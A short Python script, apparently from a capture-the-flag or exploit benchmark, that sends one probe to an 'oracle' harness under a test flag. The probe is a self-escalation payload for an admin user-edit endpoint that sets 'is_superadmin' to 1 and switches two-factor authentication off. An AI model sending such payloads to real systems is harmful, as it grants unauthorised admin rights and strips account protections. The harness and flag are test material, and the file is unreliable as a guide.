#!/usr/bin/env python3
import json
import os
os.environ.setdefault("PCB_FLAG", "PCBFLAG_276d016eb876")
import oracle

cand = {
    "endpoint": "/admin/api/user/edit",
    "mode": "self_escalate",
    "target": "self",
    "json": {
        "display_name": "Editor",
        "email": "editor@example.com",
        "last_modified": "2026-01-01 00:00:00",
        "user_status": "active",
        "is_superadmin": 1,
        "overwrite_twofactor": "off",
    },
}
print(json.dumps(oracle.run_probe(cand, version="v1"), indent=2, default=str))
